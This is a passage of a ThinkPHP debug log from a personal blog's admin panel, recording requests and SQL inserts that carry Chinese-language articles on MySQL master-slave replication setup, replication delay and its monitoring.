p;&nbsp;&nbsp;&nbsp;Master_SSL_Cipher:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_Key:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Seconds_Behind_Master:&nbsp;0Master_SSL_Verify_Server_Cert:&nbsp;No\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_IO_Errno:&nbsp;0\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_IO_Error:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_SQL_Errno:&nbsp;0\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_SQL_Error:\r\n&nbsp;&nbsp;Replicate_Ignore_Server_Ids:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_Server_Id:&nbsp;1\r\n1&nbsp;row&nbsp;in&nbsp;set&nbsp;(0.00&nbsp;sec)\r\n\r\nERROR:&nbsp;No&nbsp;query&nbsp;specified</pre><p>&nbsp;</p><pre style=\"color: rgb(51, 51, 51); font-size: 14px; text-align: justify; background-color: rgb(250, 250, 252);\">如果：Slave_IO_Running:&nbsp;Yes,Slave_SQL_Running:&nbsp;Yes则为配置成功，配置错误重复上面操作即可。\r\n如果解决不了可通过查看mysql日志分析处理。</pre><pre>vim&nbsp;/var/log/mariadb/mariadb.log</pre><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\"><strong>7.测试</strong>。其实测试没啥好写的，配置成功之后直接连到主从数据库，在master上改变表、字段、数据，slave会同步变化。</p><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\"><strong>写在最后：</strong>当时想的试一试能不能用mysql自带的功能做数据库灾备，后来发现mysql数据库主从同步会有一些问题。第一个不好脚本化的东西是在同步之前需保证两边的数据库初始信息一样，因为备端配置的mysql-binlog位置只是当前主数据库信息的位置，在该位置之前的数据只能通过人工导入。第二个就是mysql主从同步时，只能进行数据库的增量同步，不能进行全量同步；还有就是如果备端出现脏数据，多了一条数据，当主那边新增一条主键相同的数据，则同步失败。之后我会尝试的能不能把这些操作脚本化，发现mysql自带的同步功能限制性很大，并且手工干预的东西太多了。</p><p><br/></p>' , 1 , 1 , 1 , '韩会强' , 'images/j663ofts_1mfebpazoq9g598c05f4342c4.jpg' , '123.233.116.122' , 1502348788 , 1502348788) [ RunTime:0.003431s ]

---------------------------------------------------------------
[ 2017-08-10T15:06:30+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html
[ log ] www.hhqblog.com/admin/article/index.html [运行时间：0.026158s][吞吐率：38.23req/s] [内存消耗：3,753.63kb] [文件加载：53]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.hhqblog.com/admin/article/add_article.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/index.html [ array (
  0 => 'allpage',
  1 => 'current',
  2 => 'keyword',
  3 => 'count',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000308s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000809s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000153s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000795s ]

---------------------------------------------------------------
[ 2017-08-10T15:06:30+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html?page=1&keyword=
[ log ] www.hhqblog.com/admin/article/index.html?page=1&keyword= [运行时间：0.029077s][吞吐率：34.39req/s] [内存消耗：3,684.44kb] [文件加载：52]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://www.hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
  'keyword' => '',
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000277s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000800s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000164s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000762s ]

---------------------------------------------------------------
[ 2017-08-10T15:06:41+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/add_article.html
[ log ] www.hhqblog.com/admin/article/add_article.html [运行时间：0.023628s][吞吐率：42.32req/s] [内存消耗：2,989.72kb] [文件加载：51]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'add_article',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Article->add_article[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/add_article.html [ array (
  0 => 'cates',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000304s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article_cate` [ RunTime:0.000824s ]
[ sql ] [ SQL ] SELECT `id`,`name` FROM `think_article_cate` [ RunTime:0.000190s ]

---------------------------------------------------------------
[ 2017-08-10T15:08:07+08:00 ] 172.17.180.47 123.233.116.122 POST /admin/article/add_article.html
[ log ] www.hhqblog.com/admin/article/add_article.html [运行时间：0.369906s][吞吐率：2.70req/s] [内存消耗：3,716.44kb] [文件加载：61]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'add_article',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'content-length' => '184407',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://www.hhqblog.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'content-type' => 'multipart/form-data; boundary=----WebKitFormBoundarylW9EuxYFAYYZEnmk',
  'referer' => 'http://www.hhqblog.com/admin/article/add_article.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
)
[ info ] [ PARAM ] array (
  'title' => '深入解析Mysql 主从同步延迟原理及解决方案',
  'cate_id' => '22',
  'type' => '0',
  'keyword' => 'Mysql， 主从，同步，延迟，同步延迟，Mysql 主从',
  'remark' => 'MySQL的主从同步是一个很成熟的架构，优点为：①在从服务器可以执行查询工作(即我们常说的读功能)，降低主服务器压力;②在从主服务器进行备份，避免备份期间影响主服务器服务;③当主服务器出现问题时，可以切换到从服务器',
  'content' => '<p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">MySQL的主从同步是一个很成熟的架构，优点为：①在从服务器可以执行查询工作(即我们常说的读功能)，降低主服务器压力;②在从主服务器进行备份，避免备份期间影响主服务器服务;③当主服务器出现问题时，可以切换到从服务器。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">相信大家对于这些好处已经非常了解了，在项目的部署中也采用这种方案。但是MySQL的主从同步一直有从库延迟的问题，那么为什么会有这种问题。这种问题如何解决呢？</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">1. MySQL数据库主从同步延迟原理。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">2. MySQL数据库主从同步延迟是怎么产生的。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">3. MySQL数据库主从同步延迟解决方案。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">&nbsp;</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">1. MySQL数据库主从同步延迟原理。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">答：谈到MySQL数据库主从同步延迟原理，得从mysql的数据库主从复制原理说起，mysql的主从复制都是单线程的操作，主库对所有DDL和 DML产生binlog，binlog是顺序写，所以效率很高，slave的Slave_IO_Running线程到主库取日志，效率很比较高，下一步， 问题来了，slave的Slave_SQL_Running线程将主库的DDL和DML操作在slave实施。DML和DDL的IO操作是随即的，不是顺 序的，成本高很多，还可能可slave上的其他查询产生lock争用，由于Slave_SQL_Running也是单线程的，所以一个DDL卡主了，需要 执行10分钟，那么所有之后的DDL会等待这个DDL执行完才会继续执行，这就导致了延时。有朋友会问：“主库上那个相同的DDL也需要执行10分，为什 么slave会延时？”，答案是master可以并发，Slave_SQL_Running线程却不可以。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">2. MySQL数据库主从同步延迟是怎么产生的。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">答：当主库的TPS并发较高时，产生的DDL数量超过slave一个sql线程所能承受的范围，那么延时就产生了，当然还有就是可能与slave的大型query语句产生了锁等待。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">3. MySQL数据库主从同步延迟解决方案</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">答：最简单的减少slave同步延时的方案就是在架构上做优化，尽量让主库的DDL快速执行。还有就是主库是写，对数据安全性较高，比如 sync_binlog=1，innodb_flush_log_at_trx_commit = 1 之类的设置，而slave则不需要这么高的数据安全，完全可以讲sync_binlog设置为0或者关闭binlog，innodb_flushlog也 可以设置为0来提高sql的执行效率。另外就是使用比主库更好的硬件设备作为slave。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="margin: 0px; padding: 0px; color: rgb(136, 136, 136);"><strong style="margin: 0px; padding: 0px;">附加：</strong></span></p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="margin: 0px; padding: 0px; color: rgb(136, 136, 136);"><strong style="margin: 0px; padding: 0px;">sync_binlog 配置说明：</strong></span></p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="margin: 0px; padding: 0px; color: rgb(136, 136, 136);"><strong style="margin: 0px; padding: 0px;">sync_binlog”：这个参数是对于MySQL系统来说是至关重要的，他不仅影响到Binlog对MySQL所带来的性能损耗，而且还影响到MySQL中数据的完整性。对于“sync_binlog”参数的各种设置的说明如下：</strong></span></p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="margin: 0px; padding: 0px; color: rgb(136, 136, 136);"><strong style="margin: 0px; padding: 0px;">sync_binlog=0，当事务提交之后，MySQL不做fsync之类的磁盘同步指令刷新binlog_cache中的信息到磁盘，而让Filesystem自行决定什么时候来做同步，或者cache满了之后才同步到磁盘。</strong></span></p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="margin: 0px; padding: 0px; color: rgb(136, 136, 136);"><strong style="margin: 0px; padding: 0px;">sync_binlog=n，当每进行n次事务提交之后，MySQL将进行一次fsync之类的磁盘同步指令来将binlog_cache中的数据强制写入磁盘。</strong></span></p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="margin: 0px; padding: 0px; color: rgb(136, 136, 136);"><strong style="margin: 0px; padding: 0px;">在MySQL中系统默认的设置是sync_binlog=0，也就是不做任何强制性的磁盘刷新指令，这时候的性能是最好的，但是风险也是最大的。因为一旦系统Crash，在binlog_cache中的所有binlog信息都会被丢失。而当设置为“1”的时候，是最安全但是性能损耗最大的设置。因为当设置为1的时候，即使系统Crash，也最多丢失binlog_cache中未完成的一个事务，对实际数据没有任何实质性影响。</strong></span></p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="margin: 0px; padding: 0px; color: rgb(136, 136, 136);"><strong style="margin: 0px; padding: 0px;">从以往经验和相关测试来看，对于高并发事务的系统来说，“sync_binlog”设置为0和设置为1的系统写入性能差距可能高达5倍甚至更多。</strong></span></p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="margin: 0px; padding: 0px; color: rgb(136, 136, 136);"><strong style="margin: 0px; padding: 0px;">innodb_flush_log_at_trx_commit 配置说明：</strong></span></p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="margin: 0px; padding: 0px; color: rgb(136, 136, 136);"><strong style="margin: 0px; padding: 0px;">默认值1的意思是每一次事务提交或事务外的指令都需要把日志写入（flush）硬盘，这是很费时的。特别是使用电 池供电缓存（Battery backed up cache）时。设成2对于很多运用，特别是从MyISAM表转过来的是可以的，它的意思是不写入硬盘而是写入系统缓存。日志仍然会每秒flush到硬 盘，所以你一般不会丢失超过1-2秒的更新。设成0会更快一点，但安全方面比较差，即使MySQL挂了也可能会丢失事务的数据。而值2只会在整个操作系统 挂了时才可能丢数据。&nbsp;</strong></span></p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">&nbsp;</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">&nbsp;</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">mysql-5.6.3已经支持了多线程的主从复制。原理和丁奇的类似，丁奇的是以表做多线程，Oracle使用的是以数据库(schema)为单位做多线程，不同的库可以使用不同的复制线程。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">&nbsp;</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">基于局域网的master/slave机制在通常情况下已经可以满足&#39;实时&#39;备份的要求了。如果延迟比较大，就先确认以下几个因素：&nbsp;<br style="margin: 0px; padding: 0px;"/>1. 网络延迟<br style="margin: 0px; padding: 0px;"/>2. master负载<br style="margin: 0px; padding: 0px;"/>3. slave负载<br style="margin: 0px; padding: 0px;"/>一般的做法是，使用多台slave来分摊读请求，再从这些slave中取一台专用的服务器，只作为备份用，不进行其他任何操作，就能相对最大限度地达到&#39;实时&#39;的要求了</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">slave_net_timeout单位为秒 默认设置为 3600秒</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">参数含义：当slave从主数据库读取log数据失败后，等待多久重新建立连接并获取数据</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">master-connect-retry单位为秒 默认设置为 60秒</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">参数含义：当重新建立主从连接时，如果连接建立失败，间隔多久后重试。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">通常配置以上2个参数可以减少网络问题导致的主从数据同步延迟</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">&nbsp;</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">判断主从延时，通常有两个方法：</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">1.&nbsp;Seconds_Behind_Master &nbsp;vs &nbsp;2. mk-heartbeat，下面具体说下两者在实现功能的差别。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">可以通过监控show slave status\\G命令输出的Seconds_Behind_Master参数的值来判断，是否有发生主从延时。<br style="margin: 0px; padding: 0px;"/>其值有这么几种：<br style="margin: 0px; padding: 0px;"/>NULL - 表示io_thread或是sql_thread有任何一个发生故障，也就是该线程的Running状态是No,而非Yes.<br style="margin: 0px; padding: 0px;"/>0 - 该值为零，是我们极为渴望看到的情况，表示主从复制良好，可以认为lag不存在。<br style="margin: 0px; padding: 0px;"/>正值 - 表示主从已经出现延时，数字越大表示从库落后主库越多。<br style="margin: 0px; padding: 0px;"/>负值 - 几乎很少见，只是听一些资深的DBA说见过，其实，这是一个BUG值，该参数是不支持负值的，也就是不应该出现。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">Seconds_Behind_Master是通过比较sql_thread执行的event的timestamp和io_thread复制好的 event的timestamp(简写为ts)进行比较，而得到的这么一个差值。我们都知道的relay-log和主库的bin-log里面的内容完全一 样，在记录sql语句的同时会被记录上当时的ts，所以比较参考的值来自于binlog，其实主从没有必要与NTP进行同步，也就是说无需保证主从时钟的 一致。你也会发现，其实比较真正是发生在io_thread与sql_thread之间，而io_thread才真正与主库有关联，于是，问题就出来了， 当主库I/O负载很大或是网络阻塞，io_thread不能及时复制binlog（没有中断，也在复制），而sql_thread一直都能跟上 io_thread的脚本，这时Seconds_Behind_Master的值是0，也就是我们认为的无延时，但是，实际上不是，你懂得。这也就是为什 么大家要批判用这个参数来监控数据库是否发生延时不准的原因，但是这个值并不是总是不准，如果当io_thread与master网络很好的情况下，那么 该值也是很有价值的。（就好比：妈–儿子–媳妇的关系，妈与儿子亲人，媳妇和儿子也亲人，不见得媳妇与妈就很亲。开个玩笑:-）之前，提到 Seconds_Behind_Master这个参数会有负值出现，我们已经知道该值是io_thread的最近跟新的ts与sql_thread执行到 的ts差值，前者始终是大于后者的，唯一的肯能就是某个event的ts发生了错误，比之前的小了，那么当这种情况发生时，负值出现就成为可能。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">方法2. mk-heartbeat，Maatkit万能工具包中的一个工具，被认为可以准确判断复制延时的方法。</p><p style="margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);">mk-heartbeat的实现也是借助timestmp的比较实现的，它首先需要保证主从服务器必须要保持一致，通过与相同的一个NTP server同步时钟。它需要在主库上创建一个heartbeat的表，里面至少有id与ts两个字段，id为server_id，ts就是当前的时间戳 now()，该结构也会被复制到从库上，表建好以后，会在主库上以后台进程的模式去执行一行更新操作的命令，定期去向表中的插入数据，这个周期默认为1 秒，同时从库也会在后台执行一个监控命令，与主库保持一致的周期去比较，复制过来记录的ts值与主库上的同一条ts值，差值为0表示无延时，差值越大表示 延时的秒数越多。我们都知道复制是异步的ts不肯完全一致，所以该工具允许半秒的差距，在这之内的差异都可忽略认为无延时。这个工具就是通过实打实的复 制，巧妙的借用timestamp来检查延时，赞一个！</p><p><br/></p>',
  'is_tui' => '1',
  'status' => '1',
  'views' => '1',
  'auth' => '韩会强',
)
[ info ] [ RUN ] app\admin\controller\Article->add_article[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000317s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000855s ]
[ sql ] [ SQL ] INSERT INTO `think_article` (`title` , `cate_id` , `type` , `keyword` , `remark` , `content` , `is_tui` , `status` , `views` , `auth` , `photo` , `ip` , `update_time` , `create_time`) VALUES ('深入解析Mysql 主从同步延迟原理及解决方案' , 22 , 0 , 'Mysql， 主从，同步，延迟，同步延迟，Mysql 主从' , 'MySQL的主从同步是一个很成熟的架构，优点为：①在从服务器可以执行查询工作(即我们常说的读功能)，降低主服务器压力;②在从主服务器进行备份，避免备份期间影响主服务器服务;③当主服务器出现问题时，可以切换到从服务器' , '<p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">MySQL的主从同步是一个很成熟的架构，优点为：①在从服务器可以执行查询工作(即我们常说的读功能)，降低主服务器压力;②在从主服务器进行备份，避免备份期间影响主服务器服务;③当主服务器出现问题时，可以切换到从服务器。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">相信大家对于这些好处已经非常了解了，在项目的部署中也采用这种方案。但是MySQL的主从同步一直有从库延迟的问题，那么为什么会有这种问题。这种问题如何解决呢？</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">1. MySQL数据库主从同步延迟原理。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">2. MySQL数据库主从同步延迟是怎么产生的。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">3. MySQL数据库主从同步延迟解决方案。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">&nbsp;</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">1. MySQL数据库主从同步延迟原理。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">答：谈到MySQL数据库主从同步延迟原理，得从mysql的数据库主从复制原理说起，mysql的主从复制都是单线程的操作，主库对所有DDL和 DML产生binlog，binlog是顺序写，所以效率很高，slave的Slave_IO_Running线程到主库取日志，效率很比较高，下一步， 问题来了，slave的Slave_SQL_Running线程将主库的DDL和DML操作在slave实施。DML和DDL的IO操作是随即的，不是顺 序的，成本高很多，还可能可slave上的其他查询产生lock争用，由于Slave_SQL_Running也是单线程的，所以一个DDL卡主了，需要 执行10分钟，那么所有之后的DDL会等待这个DDL执行完才会继续执行，这就导致了延时。有朋友会问：“主库上那个相同的DDL也需要执行10分，为什 